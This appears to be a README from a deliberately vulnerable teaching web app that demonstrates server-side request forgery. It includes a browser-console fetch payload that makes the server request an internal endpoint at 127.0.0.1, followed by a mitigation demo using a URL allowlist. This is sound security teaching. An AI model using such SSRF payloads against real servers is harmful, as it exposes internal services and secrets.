# Server Side Request Forgery
Server is tricked into making internal requests from the outside. Typically enabled by lax internal request policies that don't properly distinguish from external. Can grant attackers access to or control of server and its contents.

## Prerequisites
At least one registered user account with a valid token. Log out then back in again if any console output indicates that the token has expired.

## Demonstrations

### upload_profile_picture_url()
#### Exploit
1. Log in as any user.
2. Open the browser console
3. Paste the following code, press enter, then observe outcome:

    `const origin = window.location.origin;
    const token = localStorage.getItem('jwt_token');

    fetch(`${origin}/upload_profile_picture_url`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
    },
    body: JSON.stringify({
        image_url: 'http://127.0.0.1:5000/internal/secret'
    })
    }).then(r => r.json()).then(console.log);`

![alt text](./screenshots/SSRF-pic_a.png.png)

#### Mitigate
1. Enable hardening.
2. Repeat exploit steps above and observe outcome:
![alt text](./screenshots/SSRF-badurl.png)

3. Paste the following code, press enter, then observe outcome (succeeds; domain on allowlist):

    `const origin = window.location.origin;
    const token = localStorage.getItem('jwt_token');

    fetch(`${origin}/upload_profile_picture_url`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
    },
    body: JSON.stringify({
        image_url: 'https://oregonstate.edu/sites/default/files/2023-09/corvallis-aerial-900x600.jpg'
    })
    }).then(r => r.json()).then(console.log);`
![alt text](./screenshots/SSRF-goodurl.png)


